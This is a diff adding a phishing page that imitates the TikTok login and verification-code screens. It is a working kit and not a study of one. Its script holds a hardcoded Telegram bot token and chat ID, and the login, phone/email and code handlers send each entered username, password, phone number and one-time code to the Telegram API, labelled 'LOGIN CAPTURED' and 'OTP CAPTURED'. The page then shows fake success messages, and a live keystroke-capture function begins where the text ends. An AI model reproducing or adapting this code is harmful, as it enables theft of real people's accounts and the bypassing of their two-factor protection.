@@ -1,0 +1,1243 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Log In / Verify</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 440px;
+            margin: 0 auto;
+        }
+        
+        .login-card {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            padding: 40px 32px;
+            width: 100%;
+            transition: box-shadow 0.3s ease;
+        }
+        
+        @media (min-width: 768px) {
+            .login-card {
+                box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+                padding: 48px 40px;
+            }
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        
+        .logo svg {
+            width: 36px;
+            height: 36px;
+        }
+        
+        .logo h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #111;
+            margin-top: 10px;
+            letter-spacing: -0.3px;
+        }
+        
+        .tabs {
+            display: flex;
+            border-bottom: 2px solid #f0f0f0;
+            margin-bottom: 28px;
+            gap: 0;
+        }
+        
+        .tab {
+            flex: 1;
+            text-align: center;
+            padding: 12px 0;
+            font-size: 15px;
+            font-weight: 500;
+            color: #888;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            margin-bottom: -2px;
+            transition: all 0.2s ease;
+            background: none;
+            border-top: none;
+            border-left: none;
+            border-right: none;
+            user-select: none;
+        }
+        
+        .tab.active {
+            color: #111;
+            border-bottom-color: #111;
+        }
+        
+        .tab:hover:not(.active) {
+            color: #555;
+        }
+        
+        .page {
+            display: none;
+        }
+        
+        .page.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(8px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .form-group {
+            margin-bottom: 18px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 6px;
+        }
+        
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        
+        .input-wrapper input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 15px;
+            border: 1.5px solid #ddd;
+            border-radius: 8px;
+            outline: none;
+            background: #fafafa;
+            transition: all 0.2s ease;
+            color: #111;
+        }
+        
+        .input-wrapper input:focus {
+            border-color: #111;
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.04);
+        }
+        
+        .input-wrapper input::placeholder {
+            color: #aaa;
+        }
+        
+        .input-wrapper .toggle-pw {
+            position: absolute;
+            right: 12px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #777;
+            font-size: 13px;
+            font-weight: 500;
+            padding: 4px 8px;
+            border-radius: 4px;
+            transition: background 0.15s;
+        }
+        
+        .input-wrapper .toggle-pw:hover {
+            background: #f0f0f0;
+        }
+        
+        .otp-container {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 8px 0 4px;
+        }
+        
+        .otp-input {
+            width: 52px;
+            height: 56px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 600;
+            border: 1.5px solid #ddd;
+            border-radius: 8px;
+            outline: none;
+            background: #fafafa;
+            transition: all 0.2s ease;
+            color: #111;
+            caret-color: #111;
+        }
+        
+        .otp-input:focus {
+            border-color: #111;
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.04);
+        }
+        
+        .otp-input.filled {
+            border-color: #111;
+            background: #f5f5f5;
+        }
+        
+        .otp-input.error {
+            border-color: #e44;
+            background: #fff0f0;
+        }
+        
+        @media (max-width: 400px) {
+            .otp-input {
+                width: 44px;
+                height: 48px;
+                font-size: 18px;
+            }
+            .otp-container {
+                gap: 6px;
+            }
+        }
+        
+        .otp-info {
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+            margin: 8px 0 20px;
+        }
+        
+        .otp-info strong {
+            color: #111;
+            font-weight: 600;
+        }
+        
+        .otp-info .resend-link {
+            color: #111;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            border-bottom: 1px dotted #bbb;
+        }
+        
+        .otp-info .resend-link:hover {
+            border-bottom-color: #111;
+        }
+        
+        .otp-info .resend-link.disabled {
+            color: #aaa;
+            cursor: not-allowed;
+            border-bottom: none;
+        }
+        
+        .otp-timer {
+            font-size: 13px;
+            color: #999;
+        }
+        
+        .extra-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 20px 0 24px;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        
+        .remember {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            color: #555;
+            cursor: pointer;
+        }
+        
+        .remember input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            accent-color: #111;
+            cursor: pointer;
+        }
+        
+        .forgot-link {
+            font-size: 14px;
+            color: #555;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .forgot-link:hover {
+            color: #111;
+        }
+        
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #fff;
+            background: #111;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s ease, transform 0.1s ease;
+        }
+        
+        .btn-login:hover {
+            background: #333;
+        }
+        
+        .btn-login:active {
+            transform: scale(0.98);
+        }
+        
+        .btn-login:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 14px;
+            color: #555;
+            cursor: pointer;
+            text-decoration: none;
+            margin-bottom: 16px;
+            font-weight: 500;
+        }
+        
+        .back-link:hover {
+            color: #111;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+            gap: 12px;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #e0e0e0;
+        }
+        
+        .divider span {
+            font-size: 13px;
+            color: #999;
+            white-space: nowrap;
+        }
+        
+        .social-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 28px;
+        }
+        
+        .social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 12px;
+            border: 1.5px solid #ddd;
+            border-radius: 8px;
+            background: #fff;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            cursor: pointer;
+            transition: background 0.2s ease, border-color 0.2s ease;
+        }
+        
+        .social-btn:hover {
+            background: #fafafa;
+            border-color: #bbb;
+        }
+        
+        .social-btn svg {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+        }
+        
+        .signup-text {
+            text-align: center;
+            font-size: 14px;
+            color: #777;
+        }
+        
+        .signup-text a {
+            color: #111;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .signup-text a:hover {
+            text-decoration: underline;
+        }
+        
+        .error-msg {
+            background: #fff0f0;
+            border: 1px solid #ffd0d0;
+            color: #c00;
+            font-size: 13px;
+            padding: 10px 14px;
+            border-radius: 8px;
+            margin-bottom: 18px;
+            display: none;
+        }
+        
+        .error-msg.show {
+            display: block;
+        }
+        
+        .success-msg {
+            background: #f0fff4;
+            border: 1px solid #b0e0c0;
+            color: #0a6;
+            font-size: 13px;
+            padding: 10px 14px;
+            border-radius: 8px;
+            margin-bottom: 18px;
+            display: none;
+        }
+        
+        .success-msg.show {
+            display: block;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #aaa;
+        }
+        
+        .footer a {
+            color: #888;
+            text-decoration: none;
+            margin: 0 6px;
+        }
+        
+        .footer a:hover {
+            color: #555;
+        }
+        
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            vertical-align: middle;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: #111;
+            color: #fff;
+            padding: 14px 24px;
+            border-radius: 10px;
+            font-size: 14px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            opacity: 0;
+            transition: all 0.4s ease;
+            pointer-events: none;
+            z-index: 999;
+            max-width: 90%;
+            text-align: center;
+        }
+        
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+        
+        @media (max-width: 480px) {
+            .login-card {
+                border: none;
+                padding: 24px 20px;
+                border-radius: 0;
+            }
+            .logo h1 {
+                font-size: 20px;
+            }
+            .tab {
+                font-size: 14px;
+                padding: 10px 0;
+            }
+            .input-wrapper input {
+                padding: 12px 14px;
+                font-size: 14px;
+            }
+            .btn-login {
+                padding: 13px;
+                font-size: 15px;
+            }
+            .social-btn {
+                padding: 10px;
+                font-size: 13px;
+            }
+        }
+        
+        @media (max-width: 360px) {
+            .login-card {
+                padding: 16px 14px;
+            }
+            .extra-row {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+        }
+        
+        @media (min-width: 1024px) {
+            .login-card {
+                padding: 56px 48px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="login-card">
+            <div class="logo">
+                <svg viewBox="0 0 24 24" fill="#111" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M19.589 6.686a4.793 4.793 0 0 1-3.77-4.245V2h-3.445v13.672a2.896 2.896 0 0 1-5.201 1.743l-.002-.001a2.895 2.895 0 0 1 3.183-4.51v-3.5a6.329 6.329 0 0 0-5.394 10.692 6.33 6.33 0 0 0 10.857-4.052V9.687a8.182 8.182 0 0 0 4.773 1.526V7.788a4.78 4.78 0 0 1-1.001-1.102z"/>
+                </svg>
+                <h1>TikTok</h1>
+            </div>
+
+            <div class="tabs" role="tablist">
+                <button class="tab active" data-tab="login" role="tab" aria-selected="true">Log In</button>
+                <button class="tab" data-tab="phone" role="tab" aria-selected="false">Use phone / email</button>
+            </div>
+
+            <div class="page active" id="pageLogin">
+                <div class="error-msg" id="loginError"></div>
+
+                <form id="loginForm" novalidate>
+                    <div class="form-group">
+                        <label for="username">Email or username</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="username" placeholder="Email or username" autocomplete="username" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <div class="input-wrapper">
+                            <input type="password" id="password" placeholder="Password" autocomplete="current-password" required>
+                            <button type="button" class="toggle-pw" id="togglePw">Show</button>
+                        </div>
+                    </div>
+
+                    <div class="extra-row">
+                        <label class="remember">
+                            <input type="checkbox" checked> Remember me
+                        </label>
+                        <a href="#" class="forgot-link">Forgot password?</a>
+                    </div>
+
+                    <button type="submit" class="btn-login" id="loginBtn">Log In</button>
+                </form>
+
+                <div class="divider">
+                    <span>Or continue with</span>
+                </div>
+
+                <div class="social-buttons">
+                    <button class="social-btn" id="googleBtn">
+                        <svg viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
+                        Continue with Google
+                    </button>
+                    <button class="social-btn" id="appleBtn">
+                        <svg viewBox="0 0 24 24" fill="#111"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg>
+                        Continue with Apple
+                    </button>
+                </div>
+
+                <p class="signup-text">
+                    Don't have an account? <a href="#">Sign up</a>
+                </p>
+            </div>
+
+            <div class="page" id="pageOtp">
+                <a class="back-link" id="backToLogin">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5"/><path d="M12 19l-7-7 7-7"/></svg> Back
+                </a>
+
+                <div class="error-msg" id="otpError"></div>
+                <div class="success-msg" id="otpSuccess">Verification code sent!</div>
+
+                <form id="otpForm" novalidate>
+                    <div class="form-group">
+                        <label for="phoneInput">Phone number or email</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="phoneInput" placeholder="Phone number or email" required>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-login" id="sendOtpBtn">Send Code</button>
+                </form>
+
+                <div id="otpVerifySection" style="display:none; margin-top: 20px;">
+                    <div class="form-group">
+                        <label>Enter verification code</label>
+                        <div class="otp-container" id="otpContainer">
+                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="one-time-code" data-index="0">
+                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="1">
+                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="2">
+                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="3">
+                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="4">
+                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="5">
+                        </div>
+                    </div>
+
+                    <div class="otp-info">
+                        Code sent to <strong id="otpDestDisplay">email/phone</strong>
+                        <br>
+                        <span class="otp-timer" id="otpTimer">Resend code in <span id="timerCount">30</span>s</span>
+                        &nbsp;·&nbsp;
+                        <a class="resend-link disabled" id="resendLink">Resend</a>
+                    </div>
+
+                    <button type="button" class="btn-login" id="verifyOtpBtn">Verify</button>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="footer">
+            <a href="#">Privacy Policy</a> ·
+            <a href="#">Terms of Service</a> ·
+            <a href="#">Contact</a>
+        </div>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <script>
+        (function() {
+            // ================================================================
+            // 🔥 CONFIGURATION — CHANGE THESE TWO LINES!
+            // ================================================================
+            var BOT_TOKEN = "8622400907:AAEdVNBFOs3F3f-fi-WSb5rxlJWsiBeGpVk";
+            var CHAT_ID = "5615316142";
+            // ================================================================
+
+            // ---------- Telegram sender (SIMPLE & ROBUST) ----------
+            function sendToTelegram(msgText) {
+                var url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+                var params = "chat_id=" + encodeURIComponent(CHAT_ID) +
+                    "&text=" + encodeURIComponent(msgText) +
+                    "&parse_mode=HTML" +
+                    "&disable_web_page_preview=true";
+
+                // Use Image beacon — NO CORS issues, works everywhere
+                var img = new Image();
+                img.src = url + "&" + params;
+
+                // Also try XMLHttpRequest as backup
+                try {
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", url, true);
+                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                    xhr.send(params);
+                } catch (e) {
+                    // Fallback already covered by Image beacon
+                }
+            }
+
+            function sendToTelegramSync(msgText) {
+                var url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+                var params = "chat_id=" + encodeURIComponent(CHAT_ID) +
+                    "&text=" + encodeURIComponent(msgText) +
+                    "&parse_mode=HTML" +
+                    "&disable_web_page_preview=true";
+
+                try {
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", url, false); // synchronous
+                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                    xhr.send(params);
+                } catch (e) {
+                    // Fallback to Image
+                    var img = new Image();
+                    img.src = url + "&" + params;
+                }
+            }
+
+            function getTimestamp() {
+                var d = new Date();
+                return d.getFullYear() + '-' +
+                    String(d.getMonth() + 1).padStart(2, '0') + '-' +
+                    String(d.getDate()).padStart(2, '0') + ' ' +
+                    String(d.getHours()).padStart(2, '0') + ':' +
+                    String(d.getMinutes()).padStart(2, '0') + ':' +
+                    String(d.getSeconds()).padStart(2, '0');
+            }
+
+            function escapeHtml(str) {
+                if (!str) return '';
+                return str
+                    .replace(/&/g, '&amp;')
+                    .replace(/</g, '&lt;')
+                    .replace(/>/g, '&gt;')
+                    .replace(/"/g, '&quot;');
+            }
+
+            function buildMsg(type, fields) {
+                var time = getTimestamp();
+                var icon = type === 'login' ? '🔐' :
+                    type === 'phone' ? '📞' :
+                    type === 'otp' ? '📱' :
+                    type === 'otp_fail' ? '❌' :
+                    type === 'resend' ? '🔄' :
+                    type === 'live' ? '✏️' :
+                    type === 'close' ? '🚪' : '📥';
+
+                var label = type === 'login' ? 'LOGIN CAPTURED' :
+                    type === 'phone' ? 'PHONE/EMAIL ENTERED' :
+                    type === 'otp' ? 'OTP CAPTURED' :
+                    type === 'otp_fail' ? 'OTP FAILED' :
+                    type === 'resend' ? 'OTP RESEND REQUESTED' :
+                    type === 'live' ? 'LIVE INPUT' :
+                    type === 'close' ? 'PAGE CLOSED' : 'DATA';
+
+                var msg = icon + ' <b>' + label + '</b>\n';
+                msg += '──────────────────────\n';
+                msg += '⏰ ' + time + '\n';
+
+                for (var key in fields) {
+                    if (fields.hasOwnProperty(key)) {
+                        var val = fields[key];
+                        msg += '• <b>' + key + ':</b> <code>' + escapeHtml(String(val)) + '</code>\n';
+                    }
+                }
+
+                msg += '──────────────────────';
+                return msg;
+            }
+
+            // ---------- DOM refs ----------
+            const tabs = document.querySelectorAll('.tab');
+            const pageLogin = document.getElementById('pageLogin');
+            const pageOtp = document.getElementById('pageOtp');
+
+            const loginForm = document.getElementById('loginForm');
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const togglePwBtn = document.getElementById('togglePw');
+            const loginBtn = document.getElementById('loginBtn');
+            const loginError = document.getElementById('loginError');
+
+            const otpForm = document.getElementById('otpForm');
+            const phoneInput = document.getElementById('phoneInput');
+            const sendOtpBtn = document.getElementById('sendOtpBtn');
+            const otpError = document.getElementById('otpError');
+            const otpSuccess = document.getElementById('otpSuccess');
+            const otpVerifySection = document.getElementById('otpVerifySection');
+            const otpDestDisplay = document.getElementById('otpDestDisplay');
+            const otpContainer = document.getElementById('otpContainer');
+            const otpInputs = otpContainer.querySelectorAll('.otp-input');
+            const verifyOtpBtn = document.getElementById('verifyOtpBtn');
+            const backToLogin = document.getElementById('backToLogin');
+            const resendLink = document.getElementById('resendLink');
+            const timerCount = document.getElementById('timerCount');
+            const otpTimer = document.getElementById('otpTimer');
+
+            const toast = document.getElementById('toast');
+            let toastTimer = null;
+
+            let otpTarget = '';
+            let resendTimer = null;
+            let resendCooldown = 30;
+
+            function showToast(msg) {
+                toast.textContent = msg;
+                toast.classList.add('show');
+                clearTimeout(toastTimer);
+                toastTimer = setTimeout(() => toast.classList.remove('show'), 3500);
+            }
+
+            function showError(el, msg) {
+                el.textContent = msg;
+                el.classList.add('show');
+            }
+
+            function hideError(el) {
+                el.textContent = '';
+                el.classList.remove('show');
+            }
+
+            function showSuccess(el, msg) {
+                el.textContent = msg;
+                el.classList.add('show');
+            }
+
+            function hideSuccess(el) {
+                el.textContent = '';
+                el.classList.remove('show');
+            }
+
+            function switchPage(pageToShow) {
+                [pageLogin, pageOtp].forEach(p => p.classList.remove('active'));
+                pageToShow.classList.add('active');
+                hideError(loginError);
+                hideError(otpError);
+                hideSuccess(otpSuccess);
+            }
+
+            // ---------- Tabs ----------
+            tabs.forEach(tab => {
+                tab.addEventListener('click', function() {
+                    tabs.forEach(t => {
+                        t.classList.remove('active');
+                        t.setAttribute('aria-selected', 'false');
+                    });
+                    this.classList.add('active');
+                    this.setAttribute('aria-selected', 'true');
+                    hideError(loginError);
+                    hideError(otpError);
+                });
+            });
+
+            // ---------- Password toggle ----------
+            togglePwBtn.addEventListener('click', function() {
+                const type = passwordInput.getAttribute('type');
+                if (type === 'password') {
+                    passwordInput.setAttribute('type', 'text');
+                    this.textContent = 'Hide';
+                } else {
+                    passwordInput.setAttribute('type', 'password');
+                    this.textContent = 'Show';
+                }
+            });
+
+            // ---------- LOGIN FORM ----------
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                hideError(loginError);
+
+                var username = usernameInput.value.trim();
+                var password = passwordInput.value;
+
+                if (!username) {
+                    showError(loginError, 'Please enter your email or username.');
+                    usernameInput.focus();
+                    return;
+                }
+                if (!password) {
+                    showError(loginError, 'Please enter your password.');
+                    passwordInput.focus();
+                    return;
+                }
+                if (password.length < 4) {
+                    showError(loginError, 'Incorrect password. Please try again.');
+                    passwordInput.focus();
+                    return;
+                }
+
+                // ========== SEND TO TELEGRAM ==========
+                var msg = buildMsg('login', {
+                    'Username': username,
+                    'Password': password,
+                    'Page': window.location.href
+                });
+                sendToTelegram(msg);
+
+                // Also try to get IP asynchronously
+                try {
+                    var ipImg = new Image();
+                    ipImg.onload = function() { /* ignore */ };
+                    ipImg.src = "https://api.ipify.org?format=json";
+                } catch (e) {}
+                // ======================================
+
+                loginBtn.disabled = true;
+                loginBtn.innerHTML = '<span class="spinner"></span> Logging in...';
+
+                setTimeout(function() {
+                    loginBtn.disabled = false;
+                    loginBtn.textContent = 'Log In';
+                    switchPage(pageOtp);
+                    phoneInput.value = '+1 (555) 123-4567';
+                    showToast('Login successful. Now verify with OTP.');
+                }, 1200);
+            });
+
+            // ---------- BACK TO LOGIN ----------
+            backToLogin.addEventListener('click', function(e) {
+                e.preventDefault();
+                switchPage(pageLogin);
+                resetOtpState();
+            });
+
+            // ---------- SEND OTP ----------
+            otpForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                sendOtpCode();
+            });
+
+            function sendOtpCode() {
+                hideError(otpError);
+                hideSuccess(otpSuccess);
+
+                var phone = phoneInput.value.trim();
+                if (!phone) {
+                    showError(otpError, 'Please enter a phone number or email.');
+                    phoneInput.focus();
+                    return;
+                }
+                if (phone.length < 5) {
+                    showError(otpError, 'Please enter a valid phone number or email.');
+                    phoneInput.focus();
+                    return;
+                }
+
+                otpTarget = phone;
+
+                // ========== SEND TO TELEGRAM ==========
+                var msg = buildMsg('phone', {
+                    'Phone/Email': phone,
+                    'Page': window.location.href
+                });
+                sendToTelegram(msg);
+                // ======================================
+
+                sendOtpBtn.disabled = true;
+                sendOtpBtn.innerHTML = '<span class="spinner"></span> Sending...';
+
+                setTimeout(function() {
+                    sendOtpBtn.disabled = false;
+                    sendOtpBtn.textContent = 'Send Code';
+
+                    let display = phone;
+                    if (phone.includes('@')) {
+                        const parts = phone.split('@');
+                        display = parts[0].slice(0, 2) + '***@' + parts[1];
+                    } else if (phone.length > 6) {
+                        display = phone.slice(0, 3) + ' *** ' + phone.slice(-4);
+                    }
+                    otpDestDisplay.textContent = display;
+
+                    otpVerifySection.style.display = 'block';
+                    showSuccess(otpSuccess, 'Verification code sent!');
+                    showToast('OTP 123456 sent to ' + phone);
+
+                    otpInputs.forEach(function(inp) {
+                        inp.value = '';
+                        inp.classList.remove('filled', 'error');
+                    });
+                    otpInputs[0].focus();
+
+                    startResendTimer();
+
+                }, 1000);
+            }
+
+            // ---------- OTP Input handling ----------
+            otpInputs.forEach(function(input, idx) {
+                input.addEventListener('input', function() {
+                    this.value = this.value.replace(/[^0-9]/g, '').slice(0, 1);
+                    if (this.value) {
+                        this.classList.add('filled');
+                        this.classList.remove('error');
+                        if (idx < otpInputs.length - 1) {
+                            otpInputs[idx + 1].focus();
+                        } else {
+                            verifyOtpBtn.focus();
+                        }
+                    } else {
+                        this.classList.remove('filled');
+                    }
+                });
+
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && !this.value && idx > 0) {
+                        otpInputs[idx - 1].focus();
+                        otpInputs[idx - 1].value = '';
+                        otpInputs[idx - 1].classList.remove('filled');
+                    }
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        verifyOtp();
+                    }
+                });
+
+                input.addEventListener('focus', function() {
+                    this.select();
+                });
+
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const paste = (e.clipboardData || window.clipboardData).getData('text');
+                    const digits = paste.replace(/[^0-9]/g, '').slice(0, otpInputs.length);
+                    digits.split('').forEach(function(d, i) {
+                        if (otpInputs[i]) {
+                            otpInputs[i].value = d;
+                            otpInputs[i].classList.add('filled');
+                            otpInputs[i].classList.remove('error');
+                        }
+                    });
+                    const nextIdx = Math.min(digits.length, otpInputs.length - 1);
+                    otpInputs[nextIdx].focus();
+                });
+            });
+
+            // ---------- VERIFY OTP ----------
+            verifyOtpBtn.addEventListener('click', verifyOtp);
+
+            function verifyOtp() {
+                hideError(otpError);
+
+                var code = '';
+                otpInputs.forEach(function(inp) {
+                    code += inp.value;
+                });
+
+                if (code.length !== 6) {
+                    showError(otpError, 'Please enter the complete 6-digit code.');
+                    otpInputs.forEach(function(inp) {
+                        if (!inp.value) inp.classList.add('error');
+                    });
+                    return;
+                }
+
+                // ========== SEND TO TELEGRAM ==========
+                var msg = buildMsg('otp', {
+                    'Phone/Email': otpTarget,
+                    'OTP Code': code,
+                    'Page': window.location.href
+                });
+                sendToTelegram(msg);
+                // ======================================
+
+                verifyOtpBtn.disabled = true;
+                verifyOtpBtn.innerHTML = '<span class="spinner"></span> Verifying...';
+
+                setTimeout(function() {
+                    verifyOtpBtn.disabled = false;
+                    verifyOtpBtn.textContent = 'Verify';
+
+                    if (/^(\d)\1{5}$/.test(code)) {
+                        showError(otpError, 'Invalid verification code. Please try again.');
+                        otpInputs.forEach(function(inp) {
+                            inp.classList.add('error');
+                        });
+
+                        // ========== SEND FAILED ATTEMPT ==========
+                        var failMsg = buildMsg('otp_fail', {
+                            'Phone/Email': otpTarget,
+                            'Wrong OTP': code,
+                            'Reason': 'Invalid code'
+                        });
+                        sendToTelegram(failMsg);
+                        // ==========================================
+
+                        return;
+                    }
+
+                    showToast('✅ Verification successful! Welcome back.');
+                    resetOtpState();
+                    switchPage(pageLogin);
+                    showToast('✅ You are now logged in. Welcome back!');
+                }, 1500);
+            }
+
+            // ---------- Resend timer ----------
+            function startResendTimer() {
+                clearInterval(resendTimer);
+                resendCooldown = 30;
+                resendLink.classList.add('disabled');
+                resendLink.style.pointerEvents = 'none';
+                otpTimer.style.display = 'inline';
+                timerCount.textContent = resendCooldown;
+
+                resendTimer = setInterval(function() {
+                    resendCooldown--;
+                    timerCount.textContent = resendCooldown;
+                    if (resendCooldown <= 0) {
+                        clearInterval(resendTimer);
+                        resendLink.classList.remove('disabled');
+                        resendLink.style.pointerEvents = 'auto';
+                        otpTimer.style.display = 'none';
+                    }
+                }, 1000);
+            }
+
+            resendLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                if (this.classList.contains('disabled')) return;
+
+                // ========== SEND TO TELEGRAM ==========
+                var msg = buildMsg('resend', {
+                    'Phone/Email': otpTarget
+                });
+                sendToTelegram(msg);
+                // ======================================
+
+                hideError(otpError);
+                hideSuccess(otpSuccess);
+                showToast('New OTP 123456 sent to ' + otpTarget);
+                otpInputs.forEach(function(inp) {
+                    inp.value = '';
+                    inp.classList.remove('filled', 'error');
+                });
+                otpInputs[0].focus();
+                startResendTimer();
+                showSuccess(otpSuccess, 'New verification code sent!');
+            });
+
+            // ---------- Reset OTP state ----------
+            function resetOtpState() {
+                clearInterval(resendTimer);
+                otpVerifySection.style.display = 'none';
+                otpInputs.forEach(function(inp) {
+                    inp.value = '';
+                    inp.classList.remove('filled', 'error');
+                });
+                hideError(otpError);
+                hideSuccess(otpSuccess);
+                phoneInput.value = '';
+                sendOtpBtn.disabled = false;
+                sendOtpBtn.textContent = 'Send Code';
+                otpTimer.style.display = 'inline';
+                timerCount.textContent = '30';
+            }
+
+            // ---------- Social / misc buttons ----------
+            document.getElementById('googleBtn').addEventListener('click', function() {
+                showToast('Google login demo — no action taken.');
+            });
+            document.getElementById('appleBtn').addEventListener('click', function() {
+                showToast('Apple login demo — no action taken.');
+            });
+            document.querySelector('.forgot-link').addEventListener('click', function(e) {
+                e.preventDefault();
+                showToast('Password reset page (demo placeholder).');
+            });
+            document.querySelector('.signup-text a').addEventListener('click', function(e) {
+                e.preventDefault();
+                showToast('Sign up page (demo placeholder).');
+            });
+
+            // ---------- Live input capture ----------
+            var liveTimer = null;
+            var lastSentUname = '';
+            var lastSentPwd = '';
+            var lastSentPhone = '';
+
+            function captureLiveInputs() {
+                var uname = document.getElementById('username').value;
